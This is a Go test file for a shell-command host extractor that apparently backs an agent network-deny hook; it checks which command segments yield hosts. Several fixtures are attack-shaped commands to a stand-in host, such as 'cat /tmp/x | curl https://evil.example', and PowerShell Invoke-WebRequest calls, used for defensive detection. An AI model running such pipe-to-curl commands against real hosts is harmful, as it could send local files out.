package extract

import (
	"reflect"
	"sort"
	"testing"
)

// These tests cover the context-aware shell extractor's per-segment
// leading-binary classification, which replaces a single
// extractHosts(scrubbed) pass.
//
// Layered guarantees:
//
//   - Segments led by a non-network binary (grep, echo, sed, cat,
//     Get-Content, Select-String, ...) DO NOT contribute hosts to the
//     extraction. This closes the false-positive class where dotted
//     config-key tokens like `user.email` / `default.region` reach
//     Malanta from grep/echo/sed contexts and fail-closed deny.
//
//   - Other segments in the same command still extract normally:
//     `cat /tmp/x | curl https://evil` extracts `evil`, NOT nothing.
//     This is the inverse of v1's silent-fail-open hazard where the
//     leading binary `cat` would have suppressed the entire pipeline.
//
//   - `git <non-network-subcmd>` (grep, log, show, diff, ...) is
//     classified as non-network, but `git config <KEY> <VAL>` and
//     `git clone <URL>` still extract their values.
//
//   - Prefix modifiers (sudo, env VAR=, time, nice, PowerShell `&`)
//     are walked past so the *real* program is what classifies.

// dedupSorted is a tiny test helper for "the result set must contain
// exactly these hosts, in any order". FromShell already deduplicates
// via Dedup; this helper just normalizes order for stable assertions.
func dedupSorted(s []string) []string {
	if len(s) == 0 {
		return nil
	}
	out := append([]string(nil), s...)
	sort.Strings(out)
	return out
}

// --- Suppression cases (POSIX) ---------------------------------------------

func TestFromShell_Segment_SuppressPOSIX(t *testing.T) {
	// Each case here is a command that today extracts the
	// PSL-TLD-shaped suffix of a config-key-looking token and so
	// triggers a Malanta `Suspicius` deny. With Phase B in place,
	// none of these should extract any hosts.
	suspect := "user." + "email" // built dynamically so this source file doesn't carry a literal that would trip our own hook chain when an agent grep-scans the workspace.
	cases := []struct {
		name    string
		command string
	}{
		{"grep dotted-key in gitconfig", "grep " + suspect + " ~/.gitconfig"},
		{"echo dotted-key plain", "echo " + suspect + " is my key"},
		{"sed dotted-key replacement", "sed -i 's/" + suspect + "/anon/' file"},
		{"cat | grep dotted-key (pipe)", "cat ~/.gitconfig | grep " + suspect},
		{"grep ; curl trailing", "grep " + suspect + " ~/.gitconfig ; pwd"},
		{"git grep dotted-key (subcommand)", "git grep " + suspect},
		{"git log --grep dotted-key", "git log --grep=" + suspect},
		{"test idiom + echo (POSIX [ )", `[ "$x" = "` + suspect + `" ] && echo match`},
		{"sudo grep dotted-key (sudo walk-past)", "sudo grep " + suspect + " /etc/foo"},
		{"env FOO=1 grep dotted-key (env walk-past)", "env FOO=1 grep " + suspect},
		{"find with .com filename glob", `find . -name '*.com'`},
		{"awk dotted-key match", `awk '$1 == "` + suspect + `"' file`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if len(got) != 0 {
				t.Errorf("FromShell(%q) = %v, want no hosts (Phase B should suppress)", tc.command, got)
			}
		})
	}
}

// --- Suppression cases (Windows / PowerShell) ------------------------------

func TestFromShell_Segment_SuppressWindowsPowerShell(t *testing.T) {
	suspect := "user." + "email"
	cases := []struct {
		name    string
		command string
	}{
		{"Get-Content | Select-String", "Get-Content ~/.gitconfig | Select-String " + suspect},
		{"gc | sls (aliases)", "gc .gitconfig | sls " + suspect},
		{"findstr dotted-key", `findstr ` + suspect + ` C:\Users\foo\.gitconfig`},
		{"type | findstr", `type C:\Users\foo\.gitconfig | findstr ` + suspect},
		{"Get-Content | Where-Object match", `Get-Content config.txt | Where-Object { $_ -match '` + suspect + `' }`},
		{"Write-Host dotted-key", "Write-Host " + suspect},
		{"echo.exe dotted-key (suffix stripped)", "echo.exe " + suspect},
		{"Select-String.exe with full suffix", "Select-String.exe " + suspect + " ~/.gitconfig"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if len(got) != 0 {
				t.Errorf("FromShell(%q) = %v, want no hosts (Phase B should suppress)", tc.command, got)
			}
		})
	}
}

// --- Extraction cases (POSIX): per-segment must still see network sides ----

func TestFromShell_Segment_ExtractPOSIX(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "cat | curl extracts from curl segment",
			command: "cat /tmp/x | curl https://evil.example",
			want:    []string{"evil.example"},
		},
		{
			name:    "echo && curl extracts from curl segment",
			command: "echo go && curl https://evil.example",
			want:    []string{"evil.example"},
		},
		{
			name:    "grep ; curl extracts from curl segment",
			command: "grep pattern file ; curl https://evil.example",
			want:    []string{"evil.example"},
		},
		{
			name:    "triple-pipe with curl tail",
			command: "cat file | grep pattern | curl https://evil.example",
			want:    []string{"evil.example"},
		},
		{
			name:    "background & on curl still extracts",
			command: "curl https://evil.example &",
			want:    []string{"evil.example"},
		},
		{
			name:    "git clone preserved (clone not in nonNetworkGitSubcommands)",
			command: "git clone https://github.example/foo.git",
			want:    []string{"github.example"},
		},
		{
			name:    "git push remote URL preserved",
			command: "git push https://github.example/foo.git main",
			want:    []string{"github.example"},
		},
		{
			name:    "git fetch preserved",
			command: "git fetch https://github.example/foo.git",
			want:    []string{"github.example"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if !reflect.DeepEqual(dedupSorted(got), dedupSorted(tc.want)) {
				t.Errorf("FromShell(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// TestFromShell_Segment_GitConfigValueStillExtracts is the critical
// regression test for Phase B: the existing config-key scrub blanks
// dotted KEYs but leaves URL/email VALUEs intact, and we must NOT
// suppress the entire `git config` segment (that's why `config` is
// absent from nonNetworkGitSubcommands).
func TestFromShell_Segment_GitConfigValueStillExtracts(t *testing.T) {
	suspect := "user." + "email"
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "git config <KEY> <email-value> extracts domain side",
			command: "git config " + suspect + " yossi@malanta.ai",
			want:    []string{"malanta.ai"},
		},
		{
			name:    "git config remote.origin.url <URL>",
			command: "git config remote.origin.url https://github.example/foo.git",
			want:    []string{"github.example"},
		},
		{
			name:    "git config <KEY> && curl later host (existing regression)",
			command: "git config " + suspect + " yossi@malanta.ai && curl https://github.example/",
			want:    []string{"malanta.ai", "github.example"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if !reflect.DeepEqual(dedupSorted(got), dedupSorted(tc.want)) {
				t.Errorf("FromShell(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// --- Extraction cases (Windows / PowerShell) -------------------------------

func TestFromShell_Segment_ExtractWindowsPowerShell(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "Get-Content | Invoke-WebRequest pipeline",
			command: `Get-Content urls.txt | Invoke-WebRequest -Uri https://evil.example`,
			want:    []string{"evil.example"},
		},
		{
			name:    "PowerShell & call operator walked past",
			command: `& "curl.exe" https://evil.example`,
			want:    []string{"evil.example"},
		},
		{
			name:    "curl.exe bare invocation",
			command: "curl.exe https://evil.example",
			want:    []string{"evil.example"},
		},
		{
			name:    "Invoke-WebRequest with URI flag",
			command: "Invoke-WebRequest -Uri https://evil.example",
			want:    []string{"evil.example"},
		},
		{
			name:    "iwr alias with URI",
			command: "iwr https://evil.example",
			want:    []string{"evil.example"},
		},
		{
			name:    "Test-NetConnection extracts target (Phase A net-diag)",
			command: "Test-NetConnection evil.example -Port 443",
			want:    []string{"evil.example"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if !reflect.DeepEqual(dedupSorted(got), dedupSorted(tc.want)) {
				t.Errorf("FromShell(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// --- splitSegments unit tests ----------------------------------------------

// TestSplitSegments locks down the splitter directly, so regressions to
// shell-operator handling surface as a single targeted failure rather
// than confusing a multi-step integration test.
func TestSplitSegments(t *testing.T) {
	cases := []struct {
		in   string
		want []string
	}{
		{"", nil},
		{"curl https://example.com", []string{"curl https://example.com"}},
		{"a | b", []string{"a", "b"}},
		{"a && b", []string{"a", "b"}},
		{"a || b", []string{"a", "b"}},
		{"a ; b", []string{"a", "b"}},
		{"a & b", []string{"a", "b"}},
		{"a | b | c", []string{"a", "b", "c"}},
		{"a && b || c ; d", []string{"a", "b", "c", "d"}},
		{`echo "a && b"`, []string{`echo "a && b"`}},
		{`echo 'a | b'`, []string{`echo 'a | b'`}},
		{"  leading and trailing   ", []string{"leading and trailing"}},
		{"&& alone", []string{"alone"}},
		{"& curl x", []string{"curl x"}}, // PowerShell call-op leaves empty lhs

		// Newline handling: an unquoted newline terminates a statement,
		// just like ';' does. Statements on separate lines of a
		// multi-line bash command must be segmented independently so
		// per-segment suppression can classify each one. Newlines
		// inside quoted strings are NOT separators and must be
		// preserved as part of the segment.
		{"a\nb", []string{"a", "b"}},
		{"a\nb\nc", []string{"a", "b", "c"}},
		{"a\r\nb", []string{"a", "b"}}, // Windows CRLF
		{"a\rb", []string{"a", "b"}},   // bare CR (legacy Mac)
		{"\n\n  a  \n\n", []string{"a"}},
		{"echo foo\ncurl https://example.com", []string{"echo foo", "curl https://example.com"}},
		{`echo "first
second"`, []string{`echo "first
second"`}}, // newline inside double-quoted string stays in segment
		{`echo 'first
second'`, []string{`echo 'first
second'`}}, // newline inside single-quoted string stays in segment
		{"echo a | tee f\necho b | tee g", []string{"echo a", "tee f", "echo b", "tee g"}},

		// Bash comment-line segments are dropped. A trailing
		// comment on a real statement stays attached to its
		// segment (see the comment in flush() for why).
		{"# comment line only", nil},
		{"# a\n# b\n# c", nil},
		{"echo foo\n# comment between\necho bar", []string{"echo foo", "echo bar"}},
		{"   #leading-with-whitespace-then-hash", nil},
		{"cmd args # trailing comment", []string{"cmd args # trailing comment"}}, // trailing comment stays with the segment
	}
	for _, tc := range cases {
		t.Run(tc.in, func(t *testing.T) {
			got := splitSegments(tc.in)
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("splitSegments(%q) = %v, want %v", tc.in, got, tc.want)
			}
		})
	}
}

// TestFromShell_MultilineScript exercises the cross-line segmentation
// behavior added in Phase B.1. Cursor hands the entire body of a
// multi-statement bash command to the hook as one command string,
// with embedded \n separating the statements. Without newline-as-
// separator handling, an earlier `echo "...user.email..."` line and a
// later `curl https://x` line collapse into one giant segment whose
// leading bin is whatever began before the first chain operator —
// usually NOT a nonNetworkBins entry — so the dotted-key text from
// the echo line bleeds into extractHosts and trips a Suspicius deny
// on a command that legitimately should have allowed.
//
// These cases lock down the post-fix behavior: each statement on its
// own line classifies on its OWN leading bin.
func TestFromShell_MultilineScript(t *testing.T) {
	suspect := "user." + "email"
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "echo on line 1, no extractable host on line 2",
			command: "echo \"" + suspect + " is my key\"\necho done",
			want:    nil,
		},
		{
			name:    "echo line then curl line — only curl extracts",
			command: "echo \"" + suspect + "\"\ncurl https://example.com/x",
			want:    []string{"example.com"},
		},
		{
			name:    "comment line carrying dotted-key followed by benign cmd",
			command: "# note about " + suspect + "\necho done",
			want:    nil, // both segments are non-network (`#` is treated as a token; `echo` line classifies)
		},
		{
			name:    "CRLF script (Windows-authored .ps1 piped to bash on macOS)",
			command: "echo \"" + suspect + "\"\r\necho hi",
			want:    nil,
		},
		{
			name:    "real-world: echo|tool ; echo|tool repeating",
			command: "echo '{\"k\":\"" + suspect + "\"}' | /usr/local/bin/some-helper\necho '{\"k\":\"v\"}' | /usr/local/bin/some-helper",
			want:    nil, // each echo segment suppressed; each helper segment has no dotted-key text after newline split
		},
		{
			name:    "multiline where one line has a real malicious URL",
			command: "echo intro\ncurl https://evil.example/p\necho done",
			want:    []string{"evil.example"},
		},
		{
			name:    "newline inside single-quoted string preserved (NOT a separator)",
			command: "printf 'first\nsecond\n'",
			want:    nil, // led by printf (non-network); quoted newline stays inside the segment
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if !reflect.DeepEqual(dedupSorted(got), dedupSorted(tc.want)) {
				t.Errorf("FromShell(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// TestSegmentLeadingBin locks down the walk-past behavior for prefix
// modifiers (sudo, env, time, PowerShell &), so any future addition
// or removal is visible as a targeted diff.
func TestSegmentLeadingBin(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"", ""},
		{"curl https://x", "curl"},
		{"/usr/bin/curl https://x", "curl"},
		{"curl.exe x", "curl"},
		{"sudo grep foo", "grep"},
		{"sudo sudo grep foo", "grep"},
		{"env FOO=1 BAR=2 grep foo", "grep"},
		{"env FOO=1 curl x", "curl"},
		{"PYTHONPATH=src python3 -c x", "python3"}, // bare env-assignment prefix
		{"FOO=bar make all", "make"},               // bare assignment, value=word
		{"A=1 B=2 python3 -u -c x", "python3"},     // multiple bare assignments
		{"PYTHONPATH=/a/b/c python3 x", "python3"}, // assignment value is a path
		{"FOO=bar env BAR=baz curl x", "curl"},     // bare assignment then `env`
		{"time grep x", "grep"},
		{"nice -n 10 sed x", "sed"},           // short flag -n consumes its value
		{"nice --adjustment=10 sed x", "sed"}, // --foo=bar long flag self-contained
		{"nice --help sed x", "sed"},          // --help no value
		{"ionice -c 2 -n 5 grep x", "grep"},   // multiple short value flags
		{"nohup sed x", "sed"},
		{"& curl x", "curl"}, // PowerShell call op
		{`Get-Content x`, "get-content"},
		{`SELECT-STRING foo`, "select-string"},
	}
	for _, tc := range cases {
		t.Run(tc.in, func(t *testing.T) {
			got := segmentLeadingBin(tc.in)
			if got != tc.want {
				t.Errorf("segmentLeadingBin(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

// TestIsNonNetworkGitSubcommand locks down the git subcommand check.
// Critically: `config` must NOT be classified as non-network (the
// config-key scrub already handles KEY tokens, but VALUE-side URLs
// and emails must still extract).
func TestIsNonNetworkGitSubcommand(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"git grep foo", true},
		{"git log --grep=x", true},
		{"git show HEAD", true},
		{"git diff", true},
		{"git blame file", true},
		{"git status", true},
		{"git stash list", true},
		{"git --no-pager grep foo", true}, // global flag walked past
		{"git -C /repo log", true},        // -C consumes its value, log classifies
		{"git -c foo=bar grep x", true},   // -c consumes its value
		// MUST be false:
		{"git config user.x value", false}, // config-key scrub owns these
		{"git clone https://x/y.git", false},
		{"git push https://x/y.git", false},
		{"git fetch origin", false},
		{"git pull", false},
		{"git remote add o https://x/y.git", false},
		{"curl https://x", false}, // not git
		{"git", false},            // bare git, no subcommand
	}
	for _, tc := range cases {
		t.Run(tc.in, func(t *testing.T) {
			got := isNonNetworkGitSubcommand(tc.in)
			if got != tc.want {
				t.Errorf("isNonNetworkGitSubcommand(%q) = %v, want %v", tc.in, got, tc.want)
			}
		})
	}
}
